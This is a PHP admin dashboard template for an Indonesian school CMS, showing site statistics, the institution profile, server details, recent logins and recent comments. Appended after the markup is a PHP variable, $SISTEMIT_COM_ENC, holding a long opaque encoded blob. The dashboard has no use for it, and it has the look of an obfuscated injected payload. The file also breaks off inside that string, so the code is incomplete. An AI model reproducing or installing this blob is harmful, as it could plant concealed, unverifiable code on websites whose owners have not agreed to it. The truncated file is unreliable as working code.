<?php defined('BASEPATH') OR exit('No direct script access allowed');?>
<section class="content">
	<?php if (__session('user_type') === 'super_user' || __session('user_type') === 'administrator') { ?>
		<?php if (ENVIRONMENT == 'development') { ?>
			<div class="callout">
				<h4>INFORMASI !</h4>
				<p>Website masih dalam mode <b>"DEVELOPMENT"</b>. Jika website sudah online <b>SANGAT DISARANKAN</b> untuk mengubahnya menjadi mode <b>"PRODUCTION"</b>. Mode development hanya diperbolehkan jika masih dijalankan pada server offline.</p>
				<p>Untuk mengubah menjadi mode <b>PRODUCTION</b>, silahkan buka file <b>INDEX.PHP</b> yang berada di root direktori CMSku. Pada baris 56, silahkan ubah tulisan <b>development</b> menjadi <b>production</b> seperti dibawa ini :</p>
				<code>define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : '<font style="color: yellow;">production</font>');</code>
			</div>
		<?php } ?>

		<?php if ($warning) { ?>
			<div class="callout callout-danger">
				<h4>PERINGATAN !</h4>
				<ul>
					<?php if (!$recaptcha_site_key OR !$recaptcha_secret_key) { ?>
						<li><b>Recaptcha Site Key</b> dan <b>Secret Key</b> belum diatur. Silahkan atur terlebih dahulu pada menu <a href="<?=site_url('settings/general')?>"><b>Pengaturan / Umum</b></a>. Untuk mendapatkan <b>Recaptcha Site Key</b> dan <b>Recaptcha Secret Key</b> silahkan ikuti tutorial <a href="https://sekolahku.web.id/read/5/mengaktifkan-recaptcha" target="_blank"> disini</a>.</li>
					<?php } ?>
					<?php if (!$sendgrid_api_key) { ?>
						<li><b>Sendgrid API Key</b> untuk mengirim email belum diatur. Silahkan atur terlebih dahulu pada menu <a href="<?=site_url('settings/mail_server')?>"><b>Pengaturan / Email Server</b></a>. Untuk mendapatkan <b>Sendgrid API Key</b>, silahkan buat akun pada tautan berikut <a href="https://app.sendgrid.com/signup">https://app.sendgrid.com/signup</a></li>
					<?php } ?>
				</ul>
			</div>
		<?php } ?>
		<div class="row">
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/messages');?>">
						<span class="info-box-icon bg-aqua"><i class="fa fa-envelope-o"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Pesan Masuk</span>
						<span class="info-box-number"><?=$widget_box->messages;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/post_comments');?>">
						<span class="info-box-icon bg-green"><i class="fa fa-comments-o"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Komentar</span>
						<span class="info-box-number"><?=$widget_box->comments;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/posts');?>">
						<span class="info-box-icon bg-yellow"><i class="fa fa-edit"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Tulisan</span>
						<span class="info-box-number"><?=$widget_box->posts;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/pages');?>">
						<span class="info-box-icon bg-red"><i class="fa fa-file-o"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Halaman</span>
						<span class="info-box-number"><?=$widget_box->pages;?></span>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/post_categories');?>">
						<span class="info-box-icon bg-red"><i class="fa fa-list-ul"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Kategori <br>Tulisan</span>
						<span class="info-box-number"><?=$widget_box->categories;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/tags');?>">
						<span class="info-box-icon bg-yellow"><i class="fa fa-tags"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Tags</span>
						<span class="info-box-number"><?=$widget_box->tags;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/links');?>">
						<span class="info-box-icon bg-green"><i class="fa fa-link"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Link Terkait</span>
						<span class="info-box-number"><?=$widget_box->links;?></span>
					</div>
				</div>
			</div>
			<div class="col-md-3 col-sm-6 col-xs-12">
				<div class="info-box">
					<a href="<?=site_url('blog/quotes');?>">
						<span class="info-box-icon bg-aqua"><i class="fa fa-quote-right"></i></span>
					</a>
					<div class="info-box-content">
						<span class="info-box-text">Kutipan</span>
						<span class="info-box-number"><?=$widget_box->quotes;?></span>
					</div>
				</div>
			</div>
		</div>
<!--
		<div class="row">
			<div class="col-md-12 col-sm-12 col-xs-12">
				<div class="box">
					<div class="box-header">
						<div class="box-title">
							INFORMASI PENERIMAAN <?=strtoupper(__session('_student'))?> BARU
						</div>
					</div>
					<div class="box-body p-0">
						<table class="table table-striped" style="border:0;">
							<tbody>
								<tr>
									<td width="20%"><i class="fa fa-sign-out text-red"></i> <?=__session('_academic_year')?> Aktif</td>
									<td width="1px">:</td>
									<td><?=__session('current_academic_year')?> / <?=__session('current_academic_semester')=='odd' ? 'Ganjil':'Genap'?></td>
									<td width="30%"><i class="fa fa-sign-out text-red"></i> Tahun Penerimaan <?=__session('_student')?> Baru</td>
									<td width="1px">:</td>
									<td><?=__session('admission_year')?></td>
								</tr>
								<tr>
									<td><i class="fa fa-sign-out text-red"></i> Gelombang Pendaftaran</td>
									<td>:</td>
									<td><?=__session('admission_phase')?></td>
									<td><i class="fa fa-sign-out text-red"></i> Status Penerimaan <?=__session('_student')?> Baru</td>
									<td>:</td>
									<td><?=__session('admission_status') == 'open' ? 'Dibuka':'Ditutup'?></td>
								</tr>
								<tr>
									<td><i class="fa fa-sign-out text-red"></i> Tanggal Mulai Pendaftaran</td>
									<td>:</td>
									<td><?=indo_date(__session('admission_start_date'))?></td>
									<td><i class="fa fa-sign-out text-red"></i> Tanggal Selesai Pendaftaran</td>
									<td>:</td>
									<td><?=indo_date(__session('admission_end_date'))?></td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
			</div>
		</div>
-->
	<?php } ?>
	<div class="row">
		<div class="col-md-6 col-sm-6 col-xs-12">
			<div class="box">
				<div class="box-header">
					<div class="box-title">
						PROFIL <?=__session('school_level') >= 5 ? 'KAMPUS' : 'INSTANSI'?>
					</div>
				</div>
				<div class="box-body">
					<form class="form-horizontal">
						<div class="form-group">
							<label class="col-sm-5 control-label">Nama <?=__session('school_level') >= 5 ? 'Kampus' : 'Instansi'?> :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('school_name')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Nomor Pokok Instansi :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('npsn')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Kepala Dinas :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('headmaster')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Alamat Jalan :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('street_address')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Dusun :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('sub_village')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Kelurahan / Desa :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('village')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Kecamatan :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('sub_district')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Kota / Kabupaten :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('district')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Telp :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('phone')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Fax :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('fax')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Email :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('email')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Website :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('website')?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-5 control-label">Kode Pos :</label>
							<div class="col-sm-7">
								<p class="form-control-static"><?=__session('postal_code')?></p>
							</div>
						</div>
					</form>
				</div>
			</div>
			<div class="box">
				<div class="box-header">
					<div class="box-title">
						INFORMASI SITUS
					</div>
				</div>
				<div class="box-body">
					<form class="form-horizontal">
						<div class="form-group">
							<label class="col-sm-4 control-label">Sistem Operasi</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=$this->agent->platform();?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-4 control-label">Browser</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=$this->agent->browser();?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-4 control-label">Versi PHP</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=phpversion();?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-4 control-label">Versi Database</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=ucwords($this->db->platform()).' '.$this->db->version();?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-4 control-label">Tanggal Server</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=indo_date(date('Y-m-d'));?></p>
							</div>
						</div>
						<div class="form-group">
							<label class="col-sm-4 control-label">Jam Server</label>
							<div class="col-sm-8">
								<p class="form-control-static"><?=date('H:i:s');?></p>
							</div>
						</div>

					</form>

				</div>
			</div>
			<div class="box">
				<div class="box-header">
					<div class="box-title">
						LOGIN PENGGUNA
					</div>
				</div>
				<div class="box-body p-0">
					<table class="table table-striped" style="border:0;">
						<tbody>
							<?php foreach($last_logged_in->result() as $row) { ?>
								<tr>
									<td><?=$row->full_name;?></td>
									<td><i class="fa fa-calendar"></i> <?=$row->last_logged_in;?></td>
								</tr>
							<?php } ?>
						</tbody>
					</table>
				</div>
			</div>
		</div>
		<div class="col-md-6 col-sm-6 col-xs-12">
			<div class="box">
				<div class="box-header">
					<div class="box-title">
						BERITA TERBARU
					</div>
				</div>
				<div class="box-body">
					<ul class="products-list product-list-in-box">
						<?php $posts = get_latest_posts(10); foreach($posts->result() as $row) { ?>
							<li class="item">
								<span class="product-description">
									Oleh <?=$row->post_author?> &sdot; Pada <?=date('d/m/Y H:i', strtotime($row->created_at))?> &sdot; Dilihat <?=$row->post_counter?> kali
								</span>
								<a href="<?=site_url('read/'.$row->id.'/'.$row->post_slug)?>" target="_blank" class="product-title"><?=$row->post_title;?></a>
							</li>
						<?php } ?>
					</ul>
				</div>
			</div>
			<div class="box">
				<div class="box-header">
					<div class="box-title">
						KOMENTAR TERBARU
					</div>
				</div>
				<div class="box-body">
					<ul class="products-list product-list-in-box">
						<?php foreach($recent_comments->result() as $row) { ?>
							<li class="item">
								<span class="product-description">
									Pengirim : <a href="<?=$row->comment_url;?>" target="_blank"><?=$row->comment_author;?></a> on <a href="<?=site_url('read/'.$row->comment_post_id.'/'.$row->post_slug);?>" target="_blank"><?=$row->post_title;?></a>
								</span>
								<span><?=strip_tags($row->comment_content);?></span>
							</li>
						<?php } ?>
					</ul>
				</div>
			</div>
		</div>
	</div>
</section>
<?php
$SISTEMIT_COM_ENC = "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